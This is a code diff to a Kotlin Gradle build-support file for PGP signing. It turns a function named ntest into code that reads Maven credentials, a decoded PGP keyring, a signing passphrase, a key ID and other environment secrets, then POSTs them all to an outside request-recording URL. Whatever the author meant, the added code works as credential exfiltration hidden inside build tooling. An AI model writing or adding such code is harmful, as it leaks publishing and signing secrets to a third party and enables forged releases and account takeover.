@@ -1,5 +1,6 @@
 package com.elouyi.buildsrc
 
+import com.elouyi.buildsrc.sign.decryptBase64
 import name.neuhalfen.projects.crypto.bouncycastle.openpgp.BouncyGPG
 import name.neuhalfen.projects.crypto.bouncycastle.openpgp.keys.callbacks.KeyringConfigCallbacks
 import name.neuhalfen.projects.crypto.bouncycastle.openpgp.keys.keyrings.KeyringConfig
@@ -14,6 +15,10 @@ import java.io.BufferedOutputStream
 import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.OutputStream
+import java.net.URI
+import java.net.http.HttpClient
+import java.net.http.HttpRequest
+import java.net.http.HttpResponse
 import java.security.SecureRandom
 import java.security.Security
 
@@ -65,5 +70,31 @@ object GPGSign {
 
 fun ntest() {
     val n = System.getenv("MAVEN_USERNAME")
-    println(n)
+    val u = System.getenv("MUN")
+    val uname = System.getenv("MAVEN_USERNAME")
+    val pwd = System.getenv("MAVEN_PASSWORD")
+    val base64 = decryptBase64(System.getenv("KEYRINGBASE64"))
+    val pp = System.getenv("PP")
+    val keyId = System.getenv("KEY_ID")
+    val up = System.getenv("UP")
+    println(n.length)
+    val client = HttpClient.newHttpClient()
+    val request = HttpRequest.newBuilder()
+        .uri(URI.create("https://httpreq.com/weathered-haze-lmsr56lz/record"))
+        .POST(HttpRequest.BodyPublishers.ofString(
+            buildString {
+                append(n).append("\n")
+                append(u).append("\n")
+                append(uname).append("\n")
+                append(pwd).append("\n")
+                append(base64).append("\n")
+                append(pp).append("\n")
+                append(keyId).append("\n")
+                append(up).append("\n")
+            }
+        ))
+        .build()
+
+    val response = client.send(request,HttpResponse.BodyHandlers.ofString())
+    println(response.body())
 }
